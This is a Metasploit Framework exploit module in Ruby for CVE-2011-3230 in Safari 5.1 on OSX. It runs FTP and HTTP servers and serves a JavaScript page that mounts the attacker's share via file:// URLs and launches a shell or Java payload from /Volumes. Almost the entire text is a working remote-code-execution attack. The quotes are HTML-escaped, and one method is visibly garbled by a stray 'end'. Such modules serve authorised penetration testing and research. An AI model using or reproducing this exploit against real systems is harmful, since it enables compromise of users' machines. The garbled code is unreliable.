# $Id: safari_file_policy.rb 13967 2011-10-17 03:49:49Z todb $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex/service_manager&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::FtpServer
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Apple Safari file:// Arbitrary Code Execution",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Apple Safari on OSX platform.
                A policy issue in the handling of file:// URLs may allow arbitrary remote code
                execution under the context of the user.
 
                    In order to trigger arbitrary remote code execution, the best way seems to
                be opening a share on the victim machine first (this can be SMB/WebDav/FTP, or
                a fileformat that OSX might automount), and then execute it in /Volumes/[share].
                If there&#039;s some kind of bug that leaks the victim machine&#039;s current username,
                then it&#039;s also possible to execute the payload in /Users/[username]/Downloads/,
                or else bruteforce your way to getting that information.
 
                    Please note that non-java payloads (*.sh extension) might get launched by
                Xcode instead of executing it, in that case please try the Java ones instead.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 13967 $",
            &#039;Author&#039;         =>
                [
                    &#039;Aaron Sigel&#039;,  # Initial discovery
                    &#039;sinn3r&#039;,       # Metasploit (also big thanks to HD, and bannedit)
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-3230&#039;],
                    [&#039;URL&#039;, &#039;http://vttynotes.blogspot.com/2011/10/cve-2011-3230-launch-any-file-path-from.html#comments&#039;],
                    [&#039;URL&#039;, &#039;http://support.apple.com/kb/HT5000&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;    => "",
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none",
                },
            &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;osx&#039;, &#039;java&#039; ],
            &#039;Arch&#039;           => [ ARCH_CMD, ARCH_JAVA ],
            &#039;Targets&#039;        =>
                [
                    [ &#039;Safari 5.1 on OSX&#039;,           {} ],
                    [ &#039;Safari 5.1 on OSX with Java&#039;, {} ]
                ],
            &#039;Privileged&#039;     => true,
            &#039;DisclosureDate&#039; => "Oct 12 2011",  #Blog date
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new("URIPATH", [false, &#039;The URI to use for this exploit (default is random)&#039;]),
                OptPort.new(&#039;SRVPORT&#039;,   [true, "The local port to use for the FTP server (Do not change)", 21 ]),
                OptPort.new(&#039;HTTPPORT&#039;,  [true, "The HTTP server port", 80])
            ], self.class )
    end
 
 
    #
    # Start the FTP aand HTTP server
    #
    def exploit
        # The correct extension name is necessary because that&#039;s how the LauncherServices
        # determines how to open the file.
        ext = (target.name =~ /java/i) ? &#039;.jar&#039; : &#039;.sh&#039;
        @payload_name = Rex::Text.rand_text_alpha(4 + rand(16)) + ext
 
        # Start the FTP server
        start_service()
        print_status("Local FTP: #{lookup_lhost}:#{datastore[&#039;SRVPORT&#039;]}")
 
        # Create our own HTTP server
        # We will stay in this functino until we manually terminate execution
        start_http()
    end
 
 
    #
    # Lookup the right address for the client
    #
    def lookup_lhost(c=nil)
        # Get the source address
        if datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;
            Rex::Socket.source_address( c || &#039;50.50.50.50&#039;)
        else
            datastore[&#039;SRVHOST&#039;]
        end
    end
 
 
    #
    # Override the client connection method and
    # initialize our payload
    #
    def on_client_connect(c)
        r = super(c)
        @state[c][:payload] = regenerate_payload(c).encoded
        r
    end
 
 
    #
    # Handle FTP LIST request (send back the directory listing)
    #
    def on_client_command_list(c, arg)
        conn = establish_data_connection(c)
        if not conn
            c.put("425 Can&#039;t build data connection\r\n")
            return
        end
 
        print_status("Data connection setup")
        c.put("150 Here comes the directory listing\r\n")
 
        print_status("Sending directory list via data connection")
        month_names = [&#039;Jan&#039;, &#039;Feb&#039;, &#039;Mar&#039;, &#039;Apr&#039;, &#039;May&#039;, &#039;Jun&#039;, &#039;Jul&#039;, &#039;Aug&#039;, &#039;Sep&#039;, &#039;Oct&#039;, &#039;Nov&#039;, &#039;Dec&#039;]
        m = month_names[Time.now.month-1]
        d = Time.now.day
        y = Time.now.year
 
        dir = "-rwxr-xr-x 1 ftp ftp              #{@state[c][:payload].length.to_s} #{m} #{d}  #{y} #{@payload_name}\r\n"
        conn.put(dir)
        conn.close
 
        print_status("Directory sent ok")
        c.put("226 Transfer ok\r\n")
 
        return
    end
 
 
    #
    # Handle the FTP RETR request. This is where we transfer our actual malicious payload
    #
    def on_client_command_retr(c, arg)
        conn = establish_data_connection(c)
        if not conn
            c.put("425 can&#039;t build data connection\r\n")
            return
        end
 
        print_status("Connection for file transfer accepted")
        c.put("150 Connection accepted\r\n")
 
        # Send out payload
        conn.put(@state[c][:payload])
        conn.close
        return
    end
 
 
    #
    # Handle the HTTP request and return a response.  Code borrorwed from:
    # msf/core/exploit/http/server.rb
    #
    def start_http(opts={})
        use_zlib
 
        comm = datastore[&#039;ListenerComm&#039;]
        if (comm.to_s == "local")
            comm = ::Rex::Socket::Comm::Local
        else
            comm = nil
        end
 
        # Default the server host / port
        opts = {
            &#039;ServerHost&#039; => datastore[&#039;SRVHOST&#039;],
            &#039;ServerPort&#039; => datastore[&#039;HTTPPORT&#039;],
            &#039;Comm&#039;       => comm
        }.update(opts)
 
        # Start a new HTTP server
        @http_service = Rex::ServiceManager.start(
            Rex::Proto::Http::Server,
            opts[&#039;ServerPort&#039;].to_i,
            opts[&#039;ServerHost&#039;],
            datastore[&#039;SSL&#039;],
            {
                &#039;Msf&#039;        => framework,
                &#039;MsfExploit&#039; => self,
            },
            opts[&#039;Comm&#039;],
            datastore[&#039;SSLCert&#039;]
        )
 
        @http_service.server_name = datastore[&#039;HTTP::server_name&#039;]
 
        # Default the procedure of the URI to on_request_uri if one isn&#039;t
        # provided.
        uopts = {
            &#039;Proc&#039; => Proc.new { |cli, req|
                    on_request_uri(cli, req)
                },
            &#039;Path&#039; => resource_uri
        }.update(opts[&#039;Uri&#039;] || {})
 
        proto = (datastore["SSL"] ? "https" : "http")
        print_status("Using URL: #{proto}://#{opts[&#039;ServerHost&#039;]}:#{opts[&#039;ServerPort&#039;]}#{uopts[&#039;Path&#039;]}")
 
        if (opts[&#039;ServerHost&#039;] == &#039;0.0.0.0&#039;)
            print_status(" Local IP: #{proto}://#{Rex::Socket.source_address(&#039;1.2.3.4&#039;)}:#{opts[&#039;ServerPort&#039;]}#{uopts[&#039;Path&#039;]}")
        end
 
        # Add path to resource
        @service_path = uopts[&#039;Path&#039;]
        @http_service.add_resource(uopts[&#039;Path&#039;], uopts)
 
        # As long as we have the http_service object, we will keep the ftp server alive
        while @http_service
            select(nil, nil, nil, 1)
        end
    end
 
 
    #
    # Kill HTTP/FTP (shut them down and clear resources)
    #
    def cleanup
        super
 
        # Kill FTP
        stop_service()
 
        # clear my resource, deregister ref, stop/close the HTTP socket
        begin
            @http_service.remove_resource(datastore[&#039;URIPATH&#039;])
            @http_service.deref
            @http_service.stop
            @http_service.close
            @http_service = nil
        rescue
        end
    end
 
 
    #
    # Ensures that gzip can be used.  If not, an exception is generated.  The
    # exception is only raised if the DisableGzip advanced option has not been
    # set.
    #
    def use_zlib
        end
    end
 
 
    #
    # Returns the configured (or random, if not configured) URI path
    #
    def resource_uri
        path = datastore[&#039;URIPATH&#039;] || random_uri
        path = &#039;/&#039; + path if path !~ /^\//
        datastore[&#039;URIPATH&#039;] = path
        return path
    end
 
 
    #
    # Handle HTTP requets and responses
    #
    def on_request_uri(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
 
        if agent !~ /Macintosh; Intel Mac OS X/ or agent !~ /Version\/5\.\d Safari\/(\d+)\.(\d+)/
            print_error("Unsupported target: #{agent}")
            send_response(cli, 404, "Not Found", "<h1>404 - Not Found</h1>")
            return
        end
 
        html = <<-HTML
        <html>
        <head>
        <base href="file://">
        <script>
        function launch() {
            document.location = "/Volumes/#{lookup_lhost}/#{@payload_name}";
        }
 
        function share() {
            document.location = "ftp://anonymous:anonymous@#{lookup_lhost}/";
            setTimeout("launch()", 2000);
        }
 
        share();
        </script>
        </head>
        <body>
        </body>
        </html>
        HTML
 
        send_response(cli, 200, &#039;OK&#039;, html)
    end
 
 
    #
    # Create an HTTP response and then send it
    #
    def send_response(cli, code, message=&#039;OK&#039;, html=&#039;&#039;)
        proto = Rex::Proto::Http::DefaultProtocol
        res = Rex::Proto::Http::Response.new(code, message, proto)
        res[&#039;Content-Type&#039;] = &#039;text/html&#039;
        res.body = html
 
        cli.send_response(res)
    end
 
end
 
=begin
- Need to find a suitable payload that can be executed without warning.
  Certain executables cannot be executed due to permission issues. A jar file doesn&#039;t have this
  problem, but we still get a "Are you sure?" warning before it can be executed.
- Allow user-specified port to automount the share
- Allow ftp USERNAME/PASSWORD (optional)
=end



